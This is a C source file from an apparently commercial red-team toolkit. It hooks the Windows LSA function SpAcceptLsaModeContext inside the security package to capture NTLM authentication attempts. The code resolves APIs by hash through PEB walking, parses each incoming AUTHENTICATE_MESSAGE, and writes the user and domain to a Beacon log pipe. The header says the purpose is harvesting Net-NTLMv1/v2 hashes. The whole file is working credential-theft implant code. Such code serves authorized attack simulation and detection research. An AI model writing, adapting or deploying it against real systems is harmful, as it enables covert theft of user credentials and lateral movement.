/**
 *
 * Captures incoming Net-NTLMv1/v2 hashes
 * for incoming authentication attempts 
 * via NTLM.
 *
 * GuidePoint Security LLC
 * Threat and Attack Simulation
 *
**/

#include "common.h"

D_SEC( D ) 
NTSTATUS NTAPI SpAcceptLsaModeContext( 
		_In_opt_ LSA_SEC_HANDLE CredentialHandle,
		_In_opt_ LSA_SEC_HANDLE ContextHandle,
		_In_ PSecBufferDesc InputBuffers,
		_In_ ULONG ContextReqFlags,
		_In_ ULONG TargetDataRep,
		_Out_ PULONG_PTR NewContextHandle,
		_Out_ PSecBufferDesc OutputBuffers,
		_Out_ PULONG ContextAttributes,
		_Out_ PTimeStamp ExpirationTime,
		_Out_ PBOOLEAN MappedContext,
		_Out_ PSecBuffer ContextData
)
{
	API		Api;
	NTSTATUS	Ret = STATUS_SUCCESS;
	PHKINFO		Inf = C_PTR( G_PTR( Table ) );

	RtlSecureZeroMemory( &Api, sizeof( Api ) );

	Api.VirtualAlloc = PeGetFuncEat( PebGetModule( H_LIB_KERNEL32 ), H_API_VIRTUALALLOC );
	Api.VirtualFree  = PeGetFuncEat( PebGetModule( H_LIB_KERNEL32 ), H_API_VIRTUALFREE );
	Api.CloseHandle  = PeGetFuncEat( PebGetModule( H_LIB_KERNEL32 ), H_API_CLOSEHANDLE );
	Api.WriteFile    = PeGetFuncEat( PebGetModule( H_LIB_KERNEL32 ), H_API_WRITEFILE );
	Api.vsnprintf    = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_VSNPRINTF );

	Ret = Inf->AcceptLsaModeContext(
		CredentialHandle,
		ContextHandle,
		InputBuffers,
		ContextReqFlags,
		TargetDataRep,
		NewContextHandle,
		OutputBuffers,
		ContextAttributes,
		ExpirationTime,
		MappedContext,
		ContextData
	);

	/* Is authentication message */
	if ( ContextHandle != 0 && Ret == STATUS_SUCCESS ) {
		BOOL				bOk = FALSE;
		LPVOID				NHx = NULL;
		LPVOID				LHx = NULL;
		PAUTHENTICATE_MESSAGE		Msg = NULL;

		Msg = C_PTR( InputBuffers->pBuffers[0].pvBuffer );

		bOk = PipePrint( &Api, 
				 Inf->BeaconLog, 
				 C_PTR( G_PTR( "User: %*.*S\nDomain: %*.*S\n" ) ),
				 Msg->UserName.Length / 2,
				 Msg->UserName.MaximumLength / 2,
				 C_PTR( U_PTR( Msg ) + Msg->UserName.BufferOffset ),
				 Msg->DomainName.Length / 2,
				 Msg->DomainName.MaximumLength / 2,
				 C_PTR( U_PTR( Msg ) + Msg->DomainName.BufferOffset ) );

		if ( bOk != TRUE ) {
			Api.CloseHandle( Inf->BeaconLog ); Inf->SecurityPackage->AcceptLsaModeContext = Inf->AcceptLsaModeContext;
		};
	};
	return Ret;
};
